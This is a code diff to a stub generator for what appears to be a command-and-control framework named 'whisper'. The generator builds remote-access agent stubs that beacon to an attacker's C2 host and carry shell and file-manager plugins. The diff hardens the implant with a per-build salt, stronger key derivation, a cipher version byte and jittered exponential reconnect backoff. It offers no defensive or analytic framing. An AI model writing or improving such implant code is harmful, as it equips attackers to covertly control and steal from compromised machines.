@@ -3,30 +3,42 @@ Generates a minimal agent stub by selecting only the needed plugins.
 Usage: python stub_generator.py --plugins shell,file_manager --host 192.168.1.100 --port 4443
 """
 
-import os, sys, re
+import os, sys, re, logging
 from plugins import PLUGIN_REGISTRY, generate_plugin, get_info
+from whisper_config import load_config
+from whisper_crypto import generate_salt
 
-BASE_TEMPLATE = r"""import socket, base64, json, os, sys, struct, hashlib, hmac, time, threading, subprocess, platform
+log = logging.getLogger("whisper.stubgen")
+
+BASE_TEMPLATE = r"""import socket, base64, json, os, sys, struct, hashlib, hmac, time, threading, subprocess, platform, secrets, random
 
 C2_HOST = "{{C2_HOST}}"
 C2_PORT = {{C2_PORT}}
 ENCRYPTION_PASSWORD = "{{ENCRYPTION_PASSWORD}}"
 RECONNECT_DELAY = {{RECONNECT_DELAY}}
+C2_SALT_HEX = "{{C2_SALT_HEX}}"
+_MAX_BACKOFF = 3600
 
-def _k(): return hashlib.pbkdf2_hmac("sha256", ENCRYPTION_PASSWORD.encode(), b"whisper_salt_2024", 100000, 32)
+def _salt(): return bytes.fromhex(C2_SALT_HEX)
+def _k(): return hashlib.pbkdf2_hmac("sha256", ENCRYPTION_PASSWORD.encode(), _salt(), 600000, 32)
+
 def _eb(p, k):
     iv = os.urandom(16); ks, c = b"", 0
     while len(ks) < len(p):
         ks += hmac.new(k, iv + struct.pack(">Q", c), hashlib.sha256).digest(); c += 1
     ct = bytes(x ^ y for x, y in zip(p, ks))
-    return iv + hmac.new(k, iv + ct, hashlib.sha256).digest()[:16] + ct
+    return b"\x00" + iv + hmac.new(k, iv + ct, hashlib.sha256).digest()[:16] + ct
+
 def _db(d, k):
+    if not d or d[0] != 0: raise ValueError("bad cipher version")
+    d = d[1:]
     iv, tag, ct = d[:16], d[16:32], d[32:]
     if not hmac.compare_digest(tag, hmac.new(k, iv + ct, hashlib.sha256).digest()[:16]): raise ValueError("integrity")
     ks, c = b"", 0
     while len(ks) < len(ct):
         ks += hmac.new(k, iv + struct.pack(">Q", c), hashlib.sha256).digest(); c += 1
     return bytes(x ^ y for x, y in zip(ct, ks))
+
 def enc(d): return base64.b64encode(_eb(json.dumps(d).encode(), _k()))
 def dec(d): return json.loads(_db(base64.b64decode(d), _k()))
 def rms(s):
@@ -49,11 +61,18 @@ def _cmd_info(m):
     return {"os":platform.platform(),"hostname":platform.node(),"user":os.environ.get("USERNAME") or os.environ.get("USER") or "unknown","arch":platform.machine(),"pid":os.getpid(),"cwd":os.getcwd()}
 _CMDS["info"] = _cmd_info
 
+def _backoff_delay(attempt):
+    delay = min(RECONNECT_DELAY * (2 ** attempt), _MAX_BACKOFF)
+    jitter = random.uniform(0, delay * 0.1)
+    return delay + jitter
+
 def _main():
+    _attempt = 0
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(30); s.connect((C2_HOST, C2_PORT))
+            _attempt = 0
             sms(s, {"type":"init","os":platform.platform(),"hostname":platform.node(),"user":os.environ.get("USERNAME") or os.environ.get("USER") or "unknown","arch":platform.machine(),"pid":os.getpid()})
             s.settimeout(15)
             while True:
@@ -81,17 +100,27 @@ def _main():
                     except Exception as e: sms(s, {"type":"response","error":str(e)})
                 else:
                     sms(s, {"type":"response","error":f"Unknown command: {m['type']}"})
-        except: pass
+        except:
+            pass
         finally:
             try: s.close()
-            except: pass
-        time.sleep(RECONNECT_DELAY)
+            except:
+                pass
+        delay = _backoff_delay(_attempt)
+        _attempt += 1
+        time.sleep(delay)
 
 if __name__ == "__main__":
     _main()
 """
 
-def generate_stub(plugin_names, host="127.0.0.1", port=4443, password="whisper_secret_key", delay=10):
+def generate_stub(plugin_names, host="127.0.0.1", port=4443, password="", delay=10, salt_hex=""):
+    cfg = load_config()
+    if not password:
+        password = cfg.c2_password or "whisper_secret_key"
+    if not salt_hex:
+        salt_hex = cfg.c2_salt_hex or generate_salt().hex()
+
     plugin_code = []
     all_cmds = {}
     for name in plugin_names:
@@ -108,6 +137,7 @@ def generate_stub(plugin_names, host="127.0.0.1", port=4443, password="whisper_s
     stub = stub.replace("{{C2_PORT}}", str(port))
     stub = stub.replace('"{{ENCRYPTION_PASSWORD}}"', repr(password))
     stub = stub.replace("{{RECONNECT_DELAY}}", str(delay))
+    stub = stub.replace('"{{C2_SALT_HEX}}"', repr(salt_hex))
     return stub
 
 def estimate_size(stub_text, plugin_names):
@@ -119,7 +149,7 @@ def main():
     parser.add_argument("--plugins", default="shell,file_manager", help="Comma-separated plugin list")
     parser.add_argument("--host", default="127.0.0.1", help="C2 host")
     parser.add_argument("--port", type=int, default=4443, help="C2 port")
-    parser.add_argument("--password", default="whisper_secret_key", help="Encryption password")
+    parser.add_argument("--password", default="", help="Encryption password (default from config)")
     parser.add_argument("--delay", type=int, default=10, help="Reconnect delay")
     parser.add_argument("--output", default="stub.py", help="Output file path")
     args = parser.parse_args()
@@ -128,7 +158,7 @@ def main():
     available = set(PLUGIN_REGISTRY.keys())
     for p in plugins:
         if p not in available:
-            print(f"[!] Unknown plugin: {p}. Available: {', '.join(sorted(available))}")
+            log.error("Unknown plugin: %s. Available: %s", p, ', '.join(sorted(available)))
             return
 
     stub = generate_stub(plugins, args.host, args.port, args.password, args.delay)
@@ -136,9 +166,8 @@ def main():
         f.write(stub)
 
     size = estimate_size(stub, plugins)
-    print(f"[+] Generated: {args.output}")
-    print(f"[+] Size: {size:,} bytes ({size/1024:.1f} KB)")
-    print(f"[+] Plugins: {', '.join(plugins)}")
+    log.info("Generated: %s (%s bytes, %.1f KB)", args.output, f"{size:,}", size/1024)
+    log.info("Plugins: %s", ', '.join(plugins))
 
 if __name__ == "__main__":
     main()
